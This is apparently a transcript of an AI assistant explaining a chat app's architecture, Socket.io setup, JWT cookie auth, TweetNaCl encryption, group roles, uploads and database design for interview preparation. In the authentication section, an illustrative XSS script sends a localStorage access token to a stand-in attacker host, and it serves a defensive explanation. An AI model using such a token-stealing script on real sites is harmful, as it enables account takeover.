# Full Conversation Transcript

This document contains the chronological record of the codebase review session for **HeyChat**.


## 👤 User Input #2

1.Architecture & Tech Stack
System design of these app 
Why PostgreSQL and not MongoDB for a chat app?
How is your project structured monolith or modular?
How do the frontend and backend communicate — REST or WebSocket only?

---

### 🤖 Assistant Response

Great questions — let me break these down deeply based on your actual codebase.

---

## 1. 🏗️ System Design of HeyChat

Here's the full architecture flow:

```
┌─────────────────────────────────────────────────────────────┐
│                        CLIENT (Browser)                      │
│                                                              │
│   React 19 + Vite   │   Zustand Stores   │  TweetNaCl E2EE  │
│                                                              │
│   ┌────────────┐    ┌─────────────────┐   ┌──────────────┐  │
│   │  apiClient │    │  socket.io-client│   │  sessionStorage│ │
│   │  (Axios)   │    │  (WebSocket)    │   │  privateKey  │  │
│   └─────┬──────┘    └────────┬────────┘   └──────────────┘  │
└─────────┼────────────────────┼────────────────────────────────┘
          │ HTTP/REST           │ WebSocket (ws://)
          ▼                     ▼
┌─────────────────────────────────────────────────────────────┐
│                    Node.js + Express 5                       │
│                                                              │
│  ┌────────┐ ┌──────┐ ┌────────┐ ┌────────┐ ┌────────┐      │
│  │ /auth  │ │/users│ │ /chats │ │/messages│ │/status │      │
│  └────────┘ └───
<truncated 9122 bytes>
s |
| `update_tick` | DELIVERED/SEEN in real-time |
| `read_conversation` | Bulk mark-as-seen |
| `typing_start/stop` | Ephemeral, no persistence needed |
| `delete_message` | Instant push to all clients |
| `send_reaction` | Live reaction updates |
| `cast_vote` | Live poll vote broadcast |
| `user_presence` | Online/offline status push |
| `receive_notification` | Push without polling |
| `chat_deleted` | Room invalidation |

### The Hybrid Rule of Thumb in Your App:
```
┌──────────────────────────────────────────────────────┐
│  "Does the action require a RESPONSE or PERSISTENCE?" │
│                                                       │
│  YES → REST (CRUD, auth, profile, media)              │
│  NO  → WebSocket (real-time push, typing, ticks)      │
└──────────────────────────────────────────────────────┘
```

### The Silent Refresh Pattern (Important!)
```js
// apiClient.js — interceptor
if (error.response?.status === 401 && !originalRequest._retry) {
  // Queue all in-flight requests
  await apiClient.post('/auth/refresh');  // Silent refresh via HTTPOnly cookie
  return apiClient(originalRequest);      // Replay original request
}
```
This means users **never see a login prompt** unless the refresh token itself expires (7 days of inactivity). This is a production-grade auth pattern.

---

### Summary Card

| Question | Answer |
|---|---|
| **System design** | Modular monolith + Socket.io rooms + PG-backed cache/queue + Cloudinary CDN |
| **PostgreSQL vs MongoDB** | ACID transactions, relational joins, PG queue (FOR UPDATE SKIP LOCKED), pg_trgm FTS — all impossible/worse in Mongo |
| **Architecture pattern** | Modular Monolith with EventBus decoupling between domains |
| **Communication** | REST for CRUD/auth/fetch; WebSocket for real-time push/presence/ticks |

---

## 👤 User Input #3

2.Real-Time (Socket.io) — Most Asked
How does Socket.io work internally — how is a connection established?
What is the difference between WebSocket and Socket.io?
How did you implement live active status?
What happens when a user suddenly disconnects — how do you detect it?
How did you handle rooms for group channels in Socket.io?
How does Socket.io scale across multiple servers? (Redis adapter)
How do you prevent a user from joining a room they are not authorized to?

---

### 🤖 Assistant Response

Let me answer every question with deep technical detail — grounded in your **actual code**, not generic theory.

---

## 1. 🔌 How Socket.io Works Internally — Connection Establishment

Socket.io has a **multi-phase handshake** before any WebSocket frame is sent:

```
CLIENT                                    SERVER
  │                                          │
  │  1. HTTP GET /socket.io/?EIO=4           │
  │     &transport=polling                   │
  │ ────────────────────────────────────────►│
  │                                          │
  │  2. HTTP 200 + session ID (sid)          │
  │ ◄────────────────────────────────────────│
  │                                          │
  │  3. HTTP GET /socket.io/?EIO=4           │
  │     &transport=websocket                 │
  │     &sid=<token>                         │
  │ ────────────────────────────────────────►│
  │                                          │
  │  4. HTTP 101 Switching Protocols         │  ← WebSocket Upgrade
  │ ◄────────────────────────────────────────│
  │                                          │
  │  ◄═══════ Full-duplex WS Tunnel ════════►│
  │                                          │
  │  5. Socket.io auth middleware runs       │
  │     (token verified, userId attached)    │
  │                                          │
  │  6. 'connection' event fires             │
  │     socket joins rooms                   │
```

In your code, you force-skip the polling phase:

```js
// chat-app-frontend/src/app/socket.js
const socket = io(SOCKET_URL, {
  autoConnect: false,
  withCredent
<truncated 12413 bytes>
ck) => {
  // STILL re-checks DB before every message
  const senderPart = await prisma.participant.findUnique({
    where: { chatId_userId: { chatId, userId } },
  });

  if (!senderPart || !['MEMBER', 'ADMIN'].includes(senderPart.role)) {
    return callback?.({ status: 'error', message: 'You are not an active member' });
  }

  // Also checks group admin-only restriction:
  if (conv.groupDetails?.onlyAdminsCanSend && senderPart.role !== 'ADMIN') {
    return callback?.({ status: 'error', message: 'Only administrators can send' });
  }
});
```

**The full security funnel:**
```
Attempt to connect
    │
    ▼
JWT valid? ──── No ──► Connection REFUSED (HTTP 401)
    │
   Yes
    │
    ▼
socket.emit('join_chats', [chatId])
    │
    ▼
DB: Is userId an ACTIVE participant? ──── No ──► Room NOT joined (silent)
    │
   Yes
    │
    ▼
socket.emit('send_message', { chatId, ... })
    │
    ▼
DB: Re-verify membership + group rules ──── No ──► callback error
    │
   Yes
    │
    ▼
Message saved & broadcast ✅
```

---

### Quick Reference Card

| Question | Your Implementation |
|---|---|
| Connection establishment | HTTP polling → WebSocket upgrade (you forced WS-only via `transports: ['websocket']`) |
| WS vs Socket.io | Socket.io adds: rooms, events, acks, heartbeat, reconnect on top of raw WS frames |
| Live status | `handlePresence()` on connect/disconnect → DB update → `user_presence` emitted to all shared rooms |
| Sudden disconnect | `pingTimeout: 60000` detects dead connections → `disconnect` event → `userSockets` cleanup → offline status |
| Group rooms | `socket.join('chat:{id}')` after DB membership verification — room = in-memory socket ID set |
| Multi-server scaling | **Not yet implemented** — needs Redis adapter + replace in-memory `userSockets` with Redis Hash |
| Unauthorized room access | **3-layer defense**: JWT middleware (connection level) → DB check on `join_chats` → DB re-check on every `send_message` |

---

## 👤 User Input #4

3.Authentication & Security — Deep Questions Expected
Why did you use cookie-based JWT instead of storing in localStorage?
What is httpOnly cookie and why does it prevent XSS?
How do you handle JWT expiry — do you use refresh tokens?
How does bcrypt hashing work — what is a salt?
How are security questions stored plain text or hashed?
How do you prevent brute force on login?

---

### 🤖 Assistant Response

All six answered with your **exact code** as the proof — interview-ready answers.

---

## 1. 🍪 Cookie-Based JWT vs localStorage — Why Cookies?

This is a **security architecture decision**, not a preference. Here's the threat model:

### The localStorage Attack Vector (XSS)
```
Attacker injects malicious script:
<script>
  // If token is in localStorage — GAME OVER
  fetch('https://evil.com/steal?t=' + localStorage.getItem('accessToken'));
</script>

// This script runs in YOUR domain's JS context
// localStorage has NO origin isolation from injected scripts
// Token is gone — attacker can impersonate the user forever
```

### Your Implementation — Cookies
```js
// auth.controller.js
const setTokenCookies = (res, accessToken, refreshToken) => {
  const isProd = process.env.NODE_ENV === 'production';
  const cookieOptions = {
    httpOnly: true,   // ← JavaScript CANNOT read this cookie
    secure: isProd,   // ← HTTPS only in production
    sameSite: isProd ? 'none' : 'lax',  // ← CSRF protection
  };

  res.cookie('accessToken', accessToken, {
    ...cookieOptions,
    maxAge: 15 * 60 * 1000,        // 15 minutes
  });
  res.cookie('refreshToken', refreshToken, {
    ...cookieOptions,
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  });
};
```

### Side-by-Side Comparison
| Attack Vector | localStorage | HTTPOnly Cookie |
|---|---|---|
| **XSS** (injected script reads token) | ❌ Vulnerable — `localStorage.getItem()` works | ✅ Safe — `document.cookie` returns empty for httpOnly |
| **CSRF** (malicious site triggers request) | ✅ Safe — not auto-sent | ❌ Needs `sameSite` to mitigate |
| **Network sniffing** | Same risk | Same risk (both need HTTPS) |
| **Physical device access** | ❌ Readable in DevTools | ✅ Not readable in DevTools Application tab |

Your `sameSite` strategy handles CSRF:
```
Development: sameSite: 'lax'
  → Cookie sent on same-site navigation
  → NOT sent on cross-origin POST requests from other domains

Production: sameSite: 'none' + secure: true
  → N
<truncated 15658 bytes>
limit=5 → BLOCKED 429
         Retry-After: 55 seconds header set
         ...
T=60s  Window resets → new attempt allowed
         → Only 5 more guesses per minute
```

### Why Email as Identifier (not just IP)?
```js
const identifier = req.body.email || req.ip;
// ↑ Prioritizes email

// Reasoning:
// IP-only: Attacker uses VPN/proxy rotation → bypasses easily
// Email:   Even with 1000 different IPs, same email = same counter
//          Targeted account brute-force is blocked regardless of IP changes
// Fallback to IP: For endpoints without email (edge cases)
```

### Weakness & Hardening Options
```
Current gap: Distributed slow brute-force
  Attacker uses 5 attempts/minute from 1000 IPs on 1 email
  → 5000 guesses/minute = ~7200/hour
  → "password1" would be found quickly

Hardening options (not yet implemented):
  1. Progressive delay (add sleep per failed attempt)
  2. Account lockout after N failures (require email verification)
  3. CAPTCHA after 3 failures
  4. Notify user via email on suspicious login pattern
  5. IP + email combined counter (dual-key rate limit)
```

---

## Summary Table

| Question | Your Implementation | Key Code |
|---|---|---|
| **Cookie vs localStorage** | HTTPOnly cookies — JS can't read them | `httpOnly: true, secure: isProd, sameSite` in `auth.controller.js` |
| **httpOnly + XSS** | Browser hard-blocks `document.cookie` for httpOnly cookies | Cookie flag set server-side, browser enforces |
| **JWT expiry + refresh** | 15min access + 7-day rotating refresh token (hash stored in DB) + blacklist on logout | `auth.service.js` — `generateTokens`, `refresh`, `logout` |
| **bcrypt + salt** | `bcrypt.hash(password, 12)` — 4096 iterations, unique random salt per hash | `auth.service.js` — `register`, `login` |
| **Security questions** | Hashed with bcrypt — never stored plaintext | `auth.service.js` — `securityQuestionHash` column |
| **Brute force prevention** | PG-backed rate limiter: 5 login attempts/minute per email | `rateLimiter.js` + `auth.routes.js` |

---

## 👤 User Input #5

4.Encryption (TweetNaCl) Unique, Will Be Probed
What is TweetNaCl and why did you use it?
What is key pair derivation how does it work in your app?
Who holds the private key client or server?
What happens to messages if a user loses their private key?
Is your encryption end-to-end or just in transit?
What is the difference between symmetric and asymmetric encryption?
give th answer of these on these base of my project

---

### 🤖 Assistant Response

Based on your **HeyChat** project, here are the detailed answers to your questions regarding TweetNaCl and the app's cryptographic implementation:

---

### 1. What is TweetNaCl and why did you use it?
* **What it is:** **TweetNaCl** is a lightweight, self-contained, and highly auditable cryptographic library. It is a JavaScript port of the NaCl/libsodium library. It provides high-level cryptographic primitives for asymmetric/symmetric encryption, signatures, and hashing.
* **Why it is used in HeyChat:** 
  * It is used to implement **End-to-End Encryption (E2EE)** for private 1-on-1 chats.
  * Specifically, it leverages **`nacl.box`**, which implements Curve25519 (for Elliptic Curve Diffie-Hellman key exchange), XSalsa20 (for symmetric encryption), and Poly1305 (for message authentication).
  * Since it runs entirely in the browser (client-side), it ensures that plaintext messages are encrypted before they ever leave the user's device.

---

### 2. What is key pair derivation and how does it work in your app?
* **Key Pair Derivation:** This is a deterministic process of generating public and private key pairs from a seed (e.g., a username and password) rather than generating random keys that must be stored separately or backed up manually.
* **How it works in your app:**
  * It is implemented in [crypto.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-frontend/src/shared/lib/crypto.js) inside the `deriveKeyPair(username, password)` function.
  * The username (trimmed and lowercased) and password are concatenated to form a seed: `username:password`.
  * This seed is hashed using SHA-512 via `nacl.hash()`.
  * The first 32 bytes of this hash are sliced off and used as the secret key seed to generate the public/private keypair using `nacl.box.keyPair.fromSecretKey()`.
  * Because it is deterministic, every time the user logs in with the correct username and password, the application derives the exact same cryptographic keys.

---

### 3. Who holds the private key: client or server?
* **The Client holds the private 
<truncated 970 bytes>
e **new password**.
  2. The server's database is updated with the **new public key**.
  3. **Historical Messages:** Because the private key has changed, any past 1-on-1 messages encrypted using the old key pair can **no longer be decrypted** by the client. In the UI, these messages will display as:
     `[Decryption Error: Key mismatch or tampered payload]`.
  4. **New Messages:** All new messages sent to or by the user after the password reset will encrypt successfully with the new key pair and will be readable.

---

### 5. Is your encryption end-to-end or just in transit?
* **It is End-to-End Encrypted (E2EE) for private 1-on-1 chats:**
  * Private messages are encrypted on the sender's device before being transmitted via WebSocket and are stored as ciphertext in the PostgreSQL database (`encryptedContent` column). They are only decrypted once they reach the recipient's device.
* **Important Caveats in your App:**
  * **Group Chats are NOT E2EE:** Group messages are currently transmitted and stored as plaintext (encrypted in transit only via HTTPS/WSS, but visible to the server/database).
  * **Media Uploads:** Media files are uploaded to Cloudinary/storage in plaintext and only the URLs are stored, meaning media attachments are encrypted in transit but not E2EE.

---

### 6. What is the difference between symmetric and asymmetric encryption?
* **Symmetric Encryption:** 
  * Uses the **same single secret key** to encrypt and decrypt data. Both parties must share this key securely beforehand.
* **Asymmetric Encryption:** 
  * Uses a **mathematically linked key pair**: a **public key** (shared publicly) and a **private key** (kept secret).
  * What is encrypted with the public key can only be decrypted by the corresponding private key.
  * In HeyChat, asymmetric encryption is utilized (`nacl.box` uses Curve25519) to securely establish a shared secret session key between two users using their respective public and private keys, allowing them to exchange encrypted messages without ever sharing their private keys.

---

## 👤 User Input #6

Group Chat & Channels
How did you design the data model for channels and members?
How do shareable invite links work — how do you prevent misuse?
How does role management work inside a group?
How do you handle a user being removed from a group mid-session?

---

### 🤖 Assistant Response

Based on the database schema and service implementations in your **HeyChat** project, here is how group chats, channels, roles, and real-time member events are managed:

---

### 1. How did you design the data model for channels and members?
Your application implements group chats using a relational schema defined in [schema.prisma](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/prisma/schema.prisma):
* **`Conversation` Model:** The core entity representing a chat. It has a `chatType` enum of either `PRIVATE` or `GROUP`.
* **`GroupDetails` Model:** A 1-to-1 extension of `Conversation` (linked via `chatId`) that stores group-specific metadata: `groupName`, `description`, `groupPhotoUrl`, and an admin-only restriction flag `onlyAdminsCanSend`.
* **`Participant` Model:** A junction table resolving the many-to-many relationship between `User` and `Conversation` (keyed on the composite key `[chatId, userId]`). It tracks:
  * `role`: A `ParticipantRole` enum representing `MEMBER`, `ADMIN`, `LEFT`, or `REMOVED`.
  * `joinedAt` and `leftAt`: Timestamps tracking when the user joined or left/was removed.
  * `clearedAt`: A timestamp tracking when a user cleared their chat history (allowing a "Delete for me" functionality that hides past messages).
  * `isPinned`: A boolean flag allowing users to pin the conversation to the top of their sidebar list.

---

### 2. How do shareable invite links work — how do you prevent misuse?
* **How Invite Links Work:**
  * Group invite links are created client-side in [ChatWindow.jsx](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-frontend/src/features/messaging/components/ChatWindow.jsx) using the layout `${window.location.origin}/join/${chatId}`.
  * When a guest visits the link, the frontend navigates to the `GroupInvite` page and calls the public route `GET /api/chats/group-preview/:chatId`. This fetches group name, description, photo, and active member count without requiring authentication.
  * When the user clicks the "Join" button, the client hits `POST /api/chats/group/:cha
<truncated 1830 bytes>
/components/ChatWindow.jsx) are conditional, wrapped in role checks:
    ```javascript
    activeChat.groupDetails?.role === 'ADMIN'
    ```
  * In addition, if `onlyAdminsCanSend` is enabled in `GroupDetails`, only administrators are allowed to use the text area.

---

### 4. How do you handle a user being removed from a group mid-session?
When an admin kicks a user (or the user leaves), your application handles the real-time ejection gracefully:
* **Database & Cache Ejection:**
  * The server updates the user's participant record, switching the role to `REMOVED` (or `LEFT`) and setting `leftAt = new Date()`.
  * A system message is written to the chat history: `[SYSTEM]:User was removed by AdminName` (which broadcasts to the room so active clients see the event).
  * The `GROUP_MEMBER_REMOVED` event fires inside [chats.listeners.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/src/modules/chats/chats.listeners.js), invalidating the cached chat list for the removed user and all remaining active group members.
* **Socket Middleware Verification:**
  * Inside [messages.sockets.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/src/modules/messages/messages.sockets.js), whenever a user tries to perform a real-time action (such as `send_message`, `send_reaction`, or `cast_vote`), the server queries the `Participant` table:
    ```javascript
    const senderPart = await prisma.participant.findUnique({
      where: { chatId_userId: { chatId, userId } },
    });
    if (!senderPart || !['MEMBER', 'ADMIN'].includes(senderPart.role)) {
      return callback?.({ status: 'error', message: 'You are not an active member of this chat' });
    }
    ```
  * The moment the user is marked as `REMOVED` or `LEFT`, their attempts to transmit events over the socket connection are blocked.
  * Once the removed user refreshes or triggers a sidebar update, the group chat disappears entirely from their screen because the query for active conversations (`listChats`) excludes participants whose roles are `LEFT` or `REMOVED`.

---

## 👤 User Input #7

6.File Uploads (Cloudinary)
How does Cloudinary integration work in your app?
Do you upload files directly from frontend or through your backend?
How do you handle large file uploads — any size limits?
How do you display a PDF preview inside the chat?
What happens if a Cloudinary upload fails mid-send?

---

### 🤖 Assistant Response

Based on the implementation in your codebase, here is how file uploads, previews, and failure scenarios are handled in **HeyChat**:

---

### 1. How does Cloudinary integration work in your app?
Your app implements Cloudinary storage using the **Adapter Pattern** and **Factory Pattern**:
* **Storage Adapter:** Your app defines a base `StorageAdapter` class. The [CloudinaryAdapter.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/src/shared/adapters/storage/CloudinaryAdapter.js) inherits from it and initializes the Cloudinary SDK using server-side configuration variables (`CLOUDINARY_CLOUD_NAME`, `CLOUDINARY_API_KEY`, and `CLOUDINARY_API_SECRET`).
* **Factory Resolution:** The [StorageFactory.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/src/shared/factories/StorageFactory.js) resolves which storage to use. If Cloudinary credentials are missing or in development, it automatically falls back to a local `MockStorageAdapter`.
* **Streaming Uploads:** To upload files, the app converts the raw buffer into a stream and pipes it using `cloudinary.uploader.upload_stream()`, which returns the secure hosted URL (`result.secure_url`). 
* **Media Deletion:** When a message is deleted for everyone, the adapter extracts the `publicId` from the file URL and destroys the file on Cloudinary using `cloudinary.uploader.destroy()`.

---

### 2. Do you upload files directly from the frontend or through your backend?
* **Uploads go through your backend.**
* The frontend client uploads the raw file as `multipart/form-data` via an Axios POST request to `/api/messages/upload` (seen in `handleSendMedia` in [ChatInput.jsx](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-frontend/src/features/messaging/components/ChatInput.jsx)).
* The backend intercepts the file using `multer.memoryStorage()`, validates the file constraints, and streams the memory buffer directly to Cloudinary.
* **Security Benefit:** This architecture ensures that your private Cloudinary API keys and secrets are never exposed to the frontend/browser client.

<truncated 656 bytes>
ap** ([uploadMiddleware.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/src/shared/middlewares/uploadMiddleware.js)).
  * The [messages.service.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/src/modules/messages/messages.service.js#L214-L229) evaluates the file buffer length against environment variables (`MAX_IMAGE_SIZE_BYTES`, `MAX_PDF_SIZE_BYTES`, `MAX_VIDEO_SIZE_BYTES`) and throws a `400 Bad Request` operational error if exceeded.

---

### 4. How do you display a PDF preview inside the chat?
* Inside [ChatBubble.jsx](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-frontend/src/features/messaging/components/ChatBubble.jsx#L254-L270), if the message's `mediaType` is `'PDF'`:
  * The app renders a clean attachment row displaying a document symbol (imported as `FileText` from `lucide-react`) and files details.
  * The entire component is wrapped in an anchor tag `<a>` pointing to the hosted `mediaUrl` with target `_blank`:
    ```jsx
    <a href={message.mediaUrl} target="_blank" rel="noreferrer" ...>
    ```
  * Clicking the bubble opens the PDF document in a new browser tab/window, leveraging the browser's built-in native PDF viewer to render and review the document.

---

### 5. What happens if a Cloudinary upload fails mid-send?
* **Exception Caught:** The upload handler on the frontend (`handleSendMedia`) wraps the API call in a `try/catch` block.
* **State Preservation:** If the network fails or Cloudinary rejects the stream mid-send, the exception is caught, the loading state (`isUploading`) is reset to `false`, and an error banner appears displaying `"Failed to upload media file"`.
* **No Lost Data:** Because the upload failed, the preview modal remains open and retains the selected file and text caption. This allows the user to simply click "Send" again to retry without losing their message data.
* **No Empty Messages:** The WebSocket event `send_message` is never triggered because the backend endpoint fails to return a valid URL. No empty or broken bubbles are ever sent to the receiver.

---

## 👤 User Input #8

7.Database Design
What does your PostgreSQL schema look like key tables?
How do you store messages — one table or separate per channel?
How do you fetch chat history efficiently any pagination?
Do you use any indexes on the messages table?


8.Trade-offs & Improvements
What would you change or improve if you rebuilt HeyChat?
What is the biggest limitation of your current design?"
How would you scale HeyChat to 10,000 concurrent users?

---

### 🤖 Assistant Response

Here are the answers to your database architecture and trade-off questions, based directly on the implementation details of your **HeyChat** project:

---

### 7. Database Design

* **What does your PostgreSQL schema look like: key tables?**
  Your database schema (managed via Prisma) consists of the following key tables:
  * **`User`**: Stores credentials, profile details, online status flags (`isOnline`, `lastSeen`), password/security question hashes, and the derived client-side asymmetric `publicKey`.
  * **`Conversation`**: The core chat entity with a `chatType` enum (`PRIVATE` / `GROUP`).
  * **`GroupDetails`**: Holds group chat metadata (`groupName`, `description`, `groupPhotoUrl`, and the messaging permission toggle `onlyAdminsCanSend`) in a 1-to-1 relationship with `Conversation`.
  * **`Participant`**: A junction table linking `User` and `Conversation` via composite key `(chatId, userId)`. It tracks user roles (`MEMBER`, `ADMIN`, `LEFT`, `REMOVED`), pin status (`isPinned`), and the deletion log marker (`clearedAt`).
  * **`Message`**: Stores message metadata, sender ID, chat ID, media type/URL, and the client-side ciphertext (`encryptedContent`).
  * **`Receipt`**: A composite junction table (`messageId, recipientId`) tracking read ticks (`SENT`, `DELIVERED`, `SEEN`) per user.
  * **`Cache` & `JobQueue`**: PostgreSQL tables used to support local database-backed caching and cron status purging.

* **How do you store messages — one table or separate per channel?**
  * All messages for all conversations (both private 1-on-1 and group chats) are stored in **a single `Message` table**. Conversations are grouped logically using the foreign key `chatId` linking back to the `Conversation` table.

* **How do you fetch chat history efficiently: any pagination?**
  * Yes. Chat history is fetched using **offset-based pagination** in [messages.service.js](file:///c:/Users/aN/Desktop/CHATAPP/chat-app-backend/src/modules/messages/messages.service.js#L23-L38):
    ```javascript
    const skip = (page - 1) * limit;
   
<truncated 1545 bytes>
ket pub/sub) and **BullMQ** (for queue processing).
  4. **Encrypt Media Files:** Perform client-side encryption on images/videos/documents before uploading them to Cloudinary.

* **What is the biggest limitation of your current design?**
  * **Deterministic Keys Derived from Password:** Since the NaCl key pair is derived directly from `username:password`, **changing the account password changes the key pair**. If a user resets their password, they immediately lose access to their entire historical private message history because the old messages can no longer be decrypted.
  * **Plaintext Groups:** Group chats bypass the `nacl.box` encryption pipeline and transmit in plaintext, presenting a server-side privacy risk.
  * **Database Write Amplification:** Storing transient caches and polling background queues in PostgreSQL causes heavy disk write cycles and table bloat at scale.

* **How would you scale HeyChat to 10,000 concurrent users?**
  1. **Horizontal Scaling with Redis Adapter:** Run multiple Node.js/Socket.io application servers behind an Application Load Balancer (ALB) and deploy the **Socket.io Redis adapter** to synchronize broadcasts and rooms across all server instances.
  2. **Connection Pooling:** Use **PgBouncer** to pool database connections. 10,000 concurrent, persistent socket channels would otherwise exhaust PostgreSQL's default connection limit.
  3. **Read Replicas:** Create PostgreSQL read-replicas to handle historical message reads, routing only writes to the master database.
  4. **In-Memory Store:** Offload session lookups, rate limiting, and chat directory lists from PostgreSQL cache tables to a Redis Cluster.

---

